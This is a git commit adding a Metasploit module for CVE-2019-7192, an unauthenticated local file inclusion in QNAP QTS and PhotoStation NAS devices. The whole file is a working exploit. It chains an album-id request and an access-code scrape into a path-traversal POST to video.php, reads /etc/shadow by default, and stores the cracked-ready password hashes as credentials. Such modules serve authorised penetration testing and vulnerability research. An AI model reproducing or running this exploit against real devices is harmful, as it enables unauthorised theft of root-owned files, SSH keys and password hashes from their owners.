ab63b05a2a3a53c55daf5d2bff7f263a4d3f4480
Niboucha Redouane <rniboucha@yahoo.fr>
2020-05-28 21:11:42 +0200

    Add the QNAP LFI module, CVE-2019–7192

---
+++ modules/auxiliary/gather/qnap_lfi.rb
@@ -0,0 +1,203 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Auxiliary
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Report
+  
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'QNAP QTS and PhotoStation Local File Inclusion',
+        'Description' => %q(
+This module abuses a vulnerability in QNAP QTS and PhotoStation that allows an
+unauthenticated user to download files off the file system, and because the server
+runs as root, it's possible to include sensitive files, including ssh private keys and
+password hashes.
+This module has been tested with QNAP QTS 4.3.3
+),
+        'Author' =>
+          [
+            'Henry Huang', # Vulnerability discovery
+            'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # MSF module
+          ],
+        'License' => MSF_LICENSE,
+        'Platform' => %w[linux],
+        'References' =>
+          [
+            [ 'CVE', '2019-7192'],
+            [ 'URL', 'https://medium.com/bugbountywriteup/qnap-pre-auth-root-rce-affecting-450k-devices-on-the-internet-d55488d28a05' ],
+            [ 'URL', 'https://github.com/Imanfeng/QNAP-NAS-RCE' ]
+          ],
+        'DisclosureDate' => 'Dec 5 2019',
+        'Targets' => [ [ 'Wildcard Target', {} ] ],
+		'DefaultTarget' => 0
+      )
+    )
+    register_options(
+      [
+        Opt::RPORT(8080),
+        OptString.new('TARGETURI', [ true, 'The URI of the QNAP Website', '/']),
+        OptString.new('FILEPATH', [ true, 'The file to read on the target', '/etc/shadow'])
+      ]
+    )
+  end
+
+  def exploit_lfi(file_path, album_id, access_code, cookies)
+    print_status 'Attempting Local File Inclusion'
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, 'photo', 'p', 'api', 'video.php'),
+      'method' => 'POST',
+      'cookie' => cookies,
+      'vars_post' => {
+        'album' => album_id,
+        'a' => 'caption',
+        'ac' => access_code,
+        # just ./../ should get to the root of the filesystem, adding more just in case
+        'filename' => './' + (file_path.start_with?('/') ? '../../../../../../..' + file_path : file_path)
+      }
+    })
+    if res && res.code == 200
+      res.body
+    end
+  end
+
+  def get_access_code(album_id, cookies)
+    print_status 'Getting the Access Code'
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, 'photo', 'slideshow.php'),
+      'vars_get' => { 'album' => album_id },
+      'cookie' => cookies
+    })
+    if res && res.code == 200
+      res.body[/(?<=encodeURIComponent\(["']).+(?=['"])/]
+    end
+  end
+
+  def get_album_id
+    print_status 'Getting the Album Id'
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, 'photo', 'p', 'api', 'album.php'),
+      'method' => 'POST',
+      'vars_post' => {
+        'a' => 'setSlideshow',
+        'f' => 'qsamplealbum'
+      }
+    })
+
+    if res && res.code == 200
+      xml_data = res.get_xml_document
+      output = xml_data.xpath('//output[1]')
+      return if output.empty?
+
+      [output.inner_text, res.get_cookies]
+    end
+  end
+
+  def check
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri'    => '/cgi-bin/authLogin.cgi'
+    )
+
+    if res && res.code == 200 && (xml = res.get_xml_document)
+ 
+      info = %w{modelName version build patch}.map {|node|
+		xml.at("//#{node}").text
+      }
+
+      vprint_status("QNAP #{info[0]} #{info[1..-1].join('-')} detected")
+      
+      if info[2].to_i < 20191206
+        Exploit::CheckCode::Appears
+      else
+        Exploit::CheckCode::Detected
+      end
+    else
+      Exploit::CheckCode::Safe
+    end
+  end
+
+  def run
+    if check == Exploit::CheckCode::Safe
+      print_error('Device does not appear to be a QNAP')
+      return
+    end
+    
+    album_id, cookies = get_album_id
+    
+    unless album_id
+      print_bad 'Failed to retrieve the Album Id'
+      return
+    end
+    
+    print_good "Got Album Id : #{album_id}"
+    
+    access_code = get_access_code(album_id, cookies)
+    
+    unless access_code
+      print_bad 'Failed to retrieve the Access Code'
+      return
+    end
+
+    print_good "Got Access Code : #{access_code}"
+    
+    file_content = exploit_lfi datastore['FILEPATH'], album_id, access_code, cookies
+    
+    if file_content.nil? || file_content.empty?
+		print_bad 'Failed to perform Local File Inclusion'
+		return
+	end
+    
+    fname = File.basename(datastore['FILEPATH'])
+    
+    path = store_loot(
+      'qnap.http',
+      'application/octet-stream',
+      datastore['RHOST'],
+      file_content,
+      fname
+    )
+    
+    print_good("====================== LFI successful ======================")
+    
+    puts file_content
+    
+    print_good("============================================================")
+    
+    print_good("File download successful, file saved in #{path}")
+    
+    return unless datastore['FILEPATH'] == '/etc/shadow'
+    
+    print_status("adding the /etc/shadow entries to the database")
+    
+    file_content.lines.each do|line|
+	
+		entries = line.split(':')
+	
+		next if entries[1] == '*' || entries[1] == '!' || entries[1] == '!!'
+	
+		credential_data = {
+          origin_type: :service,
+          address: datastore['RHOST'],
+          port: datastore['RPORT'],
+          service_name: 'QNAP',
+          protocol: 'http',
+          module_fullname: 'qnap_lfi',
+          workspace_id: myworkspace_id,
+          post_reference_name: self.fullname,
+          username: entries[0],
+          private_data: entries[1],
+          private_type: :nonreplayable_hash
+        }
+    
+        create_credential(credential_data)
+    end
+    
+ end
+end
